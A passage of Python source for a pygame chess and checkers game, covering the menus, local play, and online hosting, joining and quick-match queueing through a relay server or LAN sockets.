                row      = f"{pname}{adm_tag}   {wait}s"
                rs = FONTS["md"].render(row, True, color)
                screen.blit(rs, rs.get_rect(center=(cx, y)))
        else:
            empty = FONTS["sm"].render("No other players yet...", True, GREY_TEXT)
            screen.blit(empty, empty.get_rect(center=(cx, 210)))
        esc = FONTS["sm"].render("ESC  — cancel", True, GREY_TEXT)
        screen.blit(esc, esc.get_rect(center=(cx, WINDOW_H - 40)))
        dot_timer += clock.get_time()
        if dot_timer >= 500:
            dots = (dots + 1) % 3; dot_timer = 0
        pygame.display.flip()
        clock.tick(30)


def run_queue():
    global _save
    _save = load_save()
    apply_theme(_save)

    t_secs, t_inc = _time_select_screen()

    status = {
        "label": "Connecting to server",
        "connected": False, "error": None, "cancelled": False,
        "_conn": None, "role": None, "queue": [],
    }
    pname  = os.environ.get("USERNAME", os.environ.get("USER", "Player"))
    is_adm = _is_admin()

    def _do_queue():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((RELAY_HOST, RELAY_PORT))
            sock.sendall(json.dumps({"action": "queue", "name": pname, "is_admin": is_adm}).encode() + b"\n")
            resp, buf = _readline_sock(sock)
            if "error" in resp:
                status["error"] = resp["error"]; return
            status["label"] = "Searching for opponent"
            remaining = buf
            sock.settimeout(0.5)
            while not status["cancelled"]:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        status["error"] = "Disconnected from server"; return
                    remaining += chunk
                except socket.timeout:
                    pass
                while b"\n" in remaining:
                    line, remaining = remaining.split(b"\n", 1)
                    try:
                        msg = json.loads(line)
                    except Exception:
                        continue
                    if "queue" in msg:
                        status["queue"] = msg["queue"]
                    if msg.get("matched"):
                        sock.settimeout(None)
                        conn = Connection(sock)
                        conn.buf = remaining
                        status["role"]      = msg["role"]
                        status["_conn"]     = conn
                        status["connected"] = True
                        return
        except Exception as e:
            if not status["cancelled"]:
                status["error"] = str(e)

    threading.Thread(target=_do_queue, daemon=True).start()
    _queue_waiting_screen(status)

    if status["cancelled"] or not status.get("connected"):
        if status.get("error"):
            _show_net_error(f"Queue error: {status['error']}")
        return

    conn = status["_conn"]
    role = status["role"]

    if role == "host":
        my_color  = random.choice([W, B])
        opp_color = B if my_color == W else W
        conn.send({"type": "color", "color": opp_color,
                   "time_secs": t_secs, "increment_secs": t_inc})
        opp_theme_data, opp_skin_data = _theme_handshake_host(conn)
        gs      = GameState()
        tracker = AccuracyTracker(StockfishAnalyzer())
        _pygame_loop(gs, tracker, conn=conn, my_color=my_color, save=_save,
                     opp_theme_data=opp_theme_data, opp_skin_data=opp_skin_data,
                     time_secs=t_secs, increment_secs=t_inc)
        tracker.stop(); conn.close()
    else:
        color_msg = conn.recv()
        my_color  = color_msg["color"]
        sv_secs   = color_msg.get("time_secs")
        sv_inc    = color_msg.get("increment_secs", 0)
        opp_theme_data, opp_skin_data = _theme_handshake_join(conn)
        gs      = GameState()
        tracker = AccuracyTracker(StockfishAnalyzer())
        _pygame_loop(gs, tracker, conn=conn, my_color=my_color, save=_save,
                     opp_theme_data=opp_theme_data, opp_skin_data=opp_skin_data,
                     time_secs=sv_secs, increment_secs=sv_inc)
        tracker.stop(); conn.close()


def main_menu():
    """Mode-select → time-select. Returns (mode, param, time_secs, increment_secs)."""
    clk = pygame.time.Clock()
    join_mode = False
    join_code = ""
    BTN_W, BTN_H = 240, 56
    cx = WINDOW_W // 2
    while True:
        screen.fill(BG_APP)
        title = FONTS["xl"].render("Chess", True, WHITE_TEXT)
        screen.blit(title, title.get_rect(center=(cx, 130)))
        local_rect = pygame.Rect(cx - BTN_W // 2, 190, BTN_W, BTN_H)
        host_rect  = pygame.Rect(cx - BTN_W // 2, 258, BTN_W, BTN_H)
        join_rect  = pygame.Rect(cx - BTN_W // 2, 326, BTN_W, BTN_H)
        queue_rect = pygame.Rect(cx - BTN_W // 2, 394, BTN_W, BTN_H)
        for rect, label in [(local_rect, "Local"), (host_rect, "Host (online)"),
                            (join_rect, "Join (online)"), (queue_rect, "Quick Match")]:
            pygame.draw.rect(screen, (35, 35, 35), rect, border_radius=8)
            pygame.draw.rect(screen, ORANGE, rect, 2, border_radius=8)
            t = FONTS["lg"].render(label, True, WHITE_TEXT)
            screen.blit(t, t.get_rect(center=rect.center))
        if join_mode:
            box = pygame.Rect(cx - 110, 476, 220, 52)
            pygame.draw.rect(screen, (28, 28, 28), box, border_radius=8)
            pygame.draw.rect(screen, ORANGE, box, 2, border_radius=8)
            display_code = join_code if join_code else "    "
            cs = FONTS["xl"].render(display_code, True, WHITE_TEXT if join_code else GREY_TEXT)
            screen.blit(cs, cs.get_rect(center=box.center))
            hint = FONTS["sm"].render("Type 4-digit room code, press Enter", True, GREY_TEXT)
            screen.blit(hint, hint.get_rect(center=(cx, 546)))
        pygame.display.flip()
        for ev in pygame.event.get():
            if ev.type == pygame.QUIT:
                pygame.quit(); sys.exit()
            if ev.type in (pygame.VIDEORESIZE, getattr(pygame, "WINDOWRESIZED", -1)):
                _resize_event(ev)
            if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                if local_rect.collidepoint(ev.pos):
                    t_secs, t_inc = _time_select_screen()
                    return "local", None, t_secs, t_inc
                if host_rect.collidepoint(ev.pos):
                    t_secs, t_inc = _time_select_screen()
                    return "host", None, t_secs, t_inc
                if join_rect.collidepoint(ev.pos):
                    join_mode = True; join_code = ""
                if queue_rect.collidepoint(ev.pos):
                    return "queue", None, None, 0
            if join_mode and ev.type == pygame.KEYDOWN:
                if ev.key == pygame.K_RETURN and len(join_code) == 4:
                    return "join", join_code, None, 0  # joiner gets time from host
                elif ev.key == pygame.K_ESCAPE:
                    join_mode = False; join_code = ""
                elif ev.key == pygame.K_BACKSPACE:
                    join_code = join_code[:-1]
                elif ev.unicode.isdigit() and len(join_code) < 4:
                    join_code += ev.unicode
        clk.tick(30)


def run_local(time_secs=None, increment_secs=0):
    global _save
    _save = load_save()
    apply_theme(_save)
    while True:
        gs      = GameState()
        tracker = AccuracyTracker(StockfishAnalyzer())
        result  = _pygame_loop(gs, tracker, save=_save,
                               time_secs=time_secs, increment_secs=increment_secs)
        tracker.stop()
        if result != "again": break


def _theme_handshake_host(conn):
    """Send our theme, receive opponent's. Returns (opp_theme_data, opp_skin_data)."""
    conn.send({"type": "theme_info",
               "theme": _save.get("active_theme", "classic"),
               "skin":  _save.get("active_skin",  "standard")})
    opp = conn.recv()
    return (BOARD_THEMES.get(opp.get("theme", "classic"), BOARD_THEMES["classic"]),
            PIECE_SKINS.get(opp.get("skin",  "standard"), PIECE_SKINS["standard"]))


def _theme_handshake_join(conn):
    """Receive host's theme, send ours. Returns (opp_theme_data, opp_skin_data)."""
    opp = conn.recv()
    conn.send({"type": "theme_info",
               "theme": _save.get("active_theme", "classic"),
               "skin":  _save.get("active_skin",  "standard")})
    return (BOARD_THEMES.get(opp.get("theme", "classic"), BOARD_THEMES["classic"]),
            PIECE_SKINS.get(opp.get("skin",  "standard"), PIECE_SKINS["standard"]))


def _readline_sock(sock):
    """Read one newline-terminated JSON line from a raw socket during handshake."""
    buf = b""
    while b"\n" not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("disconnected")
        buf += chunk
    line, rest = buf.split(b"\n", 1)
    return json.loads(line), rest


def run_host(port, time_secs=None, increment_secs=0):
    global _save
    _save = load_save()
    apply_theme(_save)

    status = {"label": "Connecting to relay", "code": None, "connected": False, "error": None, "_conn": None}

    if RELAY_HOST:
        def _relay_host():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((RELAY_HOST, RELAY_PORT))
                sock.sendall(json.dumps({"action": "host"}).encode() + b"\n")
                resp, buf = _readline_sock(sock)
                status["code"] = resp["code"]
                status["label"] = "Waiting for opponent"
                conn = Connection(sock)
                conn.buf = buf
                conn.recv()
                status["_conn"] = conn
                status["connected"] = True
            except Exception as e:
                status["error"] = str(e)
        threading.Thread(target=_relay_host, daemon=True).start()
    else:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        except: ip = "127.0.0.1"
        status["code"] = ip
        status["label"] = f"Port {port}  —  Waiting for opponent"
        def _lan_host():
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", port)); srv.listen(1)
                client_sock, _ = srv.accept(); srv.close()
                status["_conn"] = Connection(client_sock)
                status["connected"] = True
            except Exception as e:
                status["error"] = str(e)
        threading.Thread(target=_lan_host, daemon=True).start()

    _net_waiting_screen(status)
    if status["error"]:
        _show_net_error(f"Error: {status['error']}"); return

    conn = status["_conn"]
    my_color  = random.choice([W, B])
    opp_color = B if my_color == W else W
    conn.send({"type": "color", "color": opp_color,
               "time_secs": time_secs, "increment_secs": increment_secs})
    opp_theme_data, opp_skin_data = _theme_handshake_host(conn)
    gs      = GameState()
    tracker = AccuracyTracker(StockfishAnalyzer())
    _pygame_loop(gs, tracker, conn=conn, my_color=my_color, save=_save,
                 opp_theme_data=opp_theme_data, opp_skin_data=opp_skin_data,
                 time_secs=time_secs, increment_secs=increment_secs)
    tracker.stop(); conn.close()


def run_join(host_ip, port):
    global _save
    _save = load_save()
    apply_theme(_save)

    status = {"label": "Connecting", "code": None, "connected": False, "error": None, "_conn": None}

    def _do_join():
        try:
            if RELAY_HOST and host_ip.isdigit() and len(host_ip) <= 4:
                code = host_ip.zfill(4)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((RELAY_HOST, RELAY_PORT))
                sock.sendall(json.dumps({"action": "join", "code": code}).encode() + b"\n")
                resp, buf = _readline_sock(sock)
                if "error" in resp:
                    status["error"] = resp["error"]; return
                conn = Connection(sock)
                conn.buf = buf
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host_ip, port))
                conn = Connection(sock)
            status["_conn"] = conn
            status["connected"] = True
        except Exception as e:
            status["error"] = str(e)

    threading.Thread(target=_do_join, daemon=True).start()
    _net_waiting_screen(status)
    if status["error"]:
        _show_net_error(f"Error: {status['error']}"); return

    conn = status["_conn"]
    color_msg   = conn.recv()
    my_color    = color_msg["color"]
    time_secs   = color_msg.get("time_secs")
    inc_secs    = color_msg.get("increment_secs", 0)
    opp_theme_data, opp_skin_data = _theme_handshake_join(conn)
    gs      = GameState()
    tracker = AccuracyTracker(StockfishAnalyzer())
    _pygame_loop(gs, tracker, conn=conn, my_color=my_color, save=_save,
                 opp_theme_data=opp_theme_data, opp_skin_data=opp_skin_data,
                 time_secs=time_secs, increment_secs=inc_secs)
    tracker.stop(); conn.close()


if __name__ == "__main__":
    pygame.init()
    screen = pygame.display.set_mode((WINDOW_W, WINDOW_H), pygame.RESIZABLE)
    pygame.display.set_caption("Chess")
    update_layout(WINDOW_W, WINDOW_H)
    init_fonts()

    args = sys.argv[1:]
    if args:
        cmd = args[0].lower()
        if cmd == "local":
            run_local()
        elif cmd == "host":
            run_host(int(args[1]) if len(args) > 1 and not RELAY_HOST else DEFAULT_PORT)
        elif cmd == "join":
            run_join(args[1], int(args[2]) if len(args) > 2 else DEFAULT_PORT)
    else:
        while True:
            game_type = game_type_screen()
            if game_type == "checkers":
                ck_save = load_save()
                apply_theme(ck_save)
                while True:
                    cs2    = CheckersState()
                    result = _checkers_loop(cs2, save=ck_save)
                    if result == "quit":
                        pygame.quit(); sys.exit()
                    if result != "again": break
                continue
            # Chess
            mode, param, t_secs, t_inc = main_menu()
            if mode == "local":
                run_local(time_secs=t_secs, increment_secs=t_inc)
            elif mode == "host":
                run_host(DEFAULT_PORT, time_secs=t_secs, increment_secs=t_inc)
            elif mode == "join":
                run_join(param, DEFAULT_PORT)
            elif mode == "queue":
                run_queue()

    pygame.quit()
